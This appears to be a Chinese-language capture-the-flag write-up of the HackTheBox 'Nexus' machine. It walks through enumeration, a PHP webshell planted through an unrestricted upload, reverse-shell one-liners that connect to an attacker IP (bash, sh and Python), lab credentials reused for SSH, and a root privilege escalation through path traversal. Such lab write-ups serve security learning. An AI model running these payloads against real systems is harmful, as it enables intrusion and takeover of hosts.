---
title: HackTheBox02
published: 2026-10-09T10:30:00
description: 本次渗透HTB Nexus靶机，从子域名枚举与Gitea仓库泄露的.env中获取凭据，登录Krayin CRM后利用上传漏洞拿到容器shell，再通过数据库密码复用SSH登录jones，最终滥用root模板同步服务的路径遍历写入SSH公钥，成功提权至root。
tags:
  - HackTheBox
  - 靶场
category: 网络安全
draft: false
---

# Nexus

## Task 1

How many open TCP ports are listening on Nexus?

nmap扫描结果：

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

answer：2

## Task 2

What is the hiring manager's full email address?

```
echo "10.129.234.54 nexus.htb" | sudo tee -a /etc/hosts
```

answer：`j.matthew@nexus.htb`

## Task 3

What is the name of the additional subdomain hosting the Git service discovered during enumeration of nexus.htb?

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb" -fs 0 -o ffuf_nexus.html -of html
```

answer：git

## Task 4

在git的commit历史中出现`N27xh!!2ucY04`

answer：N27xh!!2ucY04

## Task 5

What version of Krayin CRM is running on the billing subdomain?

利用招聘经理的邮箱和密码进行登录

点击头像可以发现版本号

answer：2.2.0

## Task 6

What CVE affects Krayin CRM version 2.2.0, allowing unrestricted PHP file upload leading to remote code execution?

## CVE-2026-38526 TinyMCE 上传接口的"裸奔"

Krayin CRM 在后台集成了 TinyMCE 富文本编辑器，方便管理员编辑内容时插入图片、媒体文件。正常情况下，这个上传接口应该只允许图片、文档等安全类型的文件。

但问题就出在这里——**服务端完全没有做文件类型校验**。没有扩展名白名单、没有 MIME 类型检查、没有文件内容魔数（Magic Bytes）验证，甚至连上传目录都没有做脚本执行限制。用行话说，这就是典型的"裸奔上传"。

漏洞路径如下：http://billing.nexus.htb/admin/tinymce/upload，访问提示提交方式必须为POST

攻击者只需要准备一个带恶意 PHP 代码的文件（比如一句话木马或完整的 Web Shell），通过 `multipart/form-data` POST 请求发到 `/admin/tinymce/upload`，服务器就会乖乖地把文件存到 `/storage/tinymce/` 目录下。而这个目录，偏偏又是**Web 可访问**的。

answer：CVE-2026-38526

## Task 7

What is the password for jones discovered during post-exploitation?

在发送邮件处发现，只能上传图片类型，在此抓包，发现上传路径与CVE的描述一致

抓包将数据改为php一句话，然后后缀改为php

现在就拿到了www-data的shell权限，现在要做的就是转为交互式

## 升级shell

1. 先开监听：

```
nc -lvnp 4444
```

2. **通过 WebShell 触发反弹**：

用 `curl` 让 WebShell 执行一条反弹命令：

```
curl -s -G "http://billing.nexus.htb/storage/tinymce/882817b0c60eb42f41bea1eaecc52638.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.17.118/4444 0>&1'"
```

如果目标没有 `bash`，换 `sh`：

```
--data-urlencode "cmd=sh -c 'sh -i >& /dev/tcp/你的Kali_IP/4444 0>&1'"
```

如果 `/dev/tcp` 被禁用，用 Python 或 nc 反弹：

```
--data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"你的Kali_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
```

3. **拿到 Shell 后升级为完全交互式**

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

然后按 `Ctrl+Z` 挂起，回到 Kali 终端：

```
stty raw -echo; fg
```

按回车，再输入：

```
export TERM=xterm
export SHELL=bash
stty rows 50 columns 200
```

查看`.env`，然后顺便查询主机有没有mysql

```
// 看了一圈权限以及配置文件等，发现没什么可利用的
mysql --version
mysql -u krayin -p'y27xb3ha!!74GbR'
…………
```

因为没找到其他可用信息，直接远程登录jones用户，密码复用进行尝试，发现可以登录

```
ssh jones@nexus.htb
# 密码：y27xb3ha!!74GbR
```

## Task 9

```
# 1. 当前身份和权限
id
sudo -l          # 检查当前用户是否有sudo权限

# 2. 系统信息
uname -a         # 内核版本，用于查找内核漏洞
cat /etc/os-release

# 3. 网络和进程
ip addr
ss -tlnp         # 查看本地监听端口，可能有只监听127.0.0.1的服务

# 4. 定时任务
cat /etc/crontab
ls -la /etc/cron.*
```

根据 HTB Nexus 的官方 Walkthrough，这台机器的标准提权路径是**滥用一个以 root 权限运行的 Gitea 模板同步服务**

**漏洞原理：**  

系统上有一个 `gitea-template-sync.service`，它会定期（约每60秒）以 **root 权限** 同步 Gitea 中标记为“模板”的仓库到本地磁盘。同步脚本 `/etc/gitea/template-sync.py` 在构建目标路径时，直接使用 `os.path.join(base_dir, name)`，而 `name` 来自 Git 树对象，**没有对 `..` 路径遍历进行过滤**。

**利用思路：**

1. 你当前是 `jones` 用户，但可以 SSH 登录。需要先**获得 Gitea 的访问权限**，创建一个仓库并将其标记为“模板”。
    
2. 然后**手动构造恶意的 Git 对象**（一个包含路径遍历文件名的树对象），推送到该仓库。
    
3. 等待 root 权限的同步服务执行，它就会将文件**写入你指定的任意路径**。最直接的利用方式是**写入 SSH 公钥到 `/root/.ssh/authorized_keys`**，从而以 root 身份 SSH 登录。

**确认 Gitea 模板同步服务的存在：**

```
systemctl status gitea-template-sync.service
```

## 手工方法

1. 通过api申请token

```
curl -X POST "http://10.129.234.54/api/v1/users/jones/tokens" \
  -H "Host: git.nexus.htb" \
  -H "Content-Type: application/json" \
  -u 'jones:y27xb3ha!!74GbR' \
  -d '{"name":"pwn","scopes":["write:repository","write:user"]}'
```

2. 构造恶意gitea树对象，提权

## 漏洞本质

- 服务以 **root** 运行
    
- 它从 Gitea 拉取“模板”仓库，把文件同步到本地目录
    
- 路径拼接用 `os.path.join(base_dir, name)`，**没有过滤 `..`**
    
- 攻击者控制 `name`（Git 树对象里的文件名）→ 任意文件写入

## 直接使用构造好的poc

```
git clone https://github.com/Shirouuu/Gitea-template-sync-Path-Traversal-Privilege-Escalation-CVE-2026-38526-.git
```

1. 直接将poc中的token改为自己申请的
2. 将poc中申请token的地址进行修改，代码中配置默认：`GITEA="http://localhost:3000"`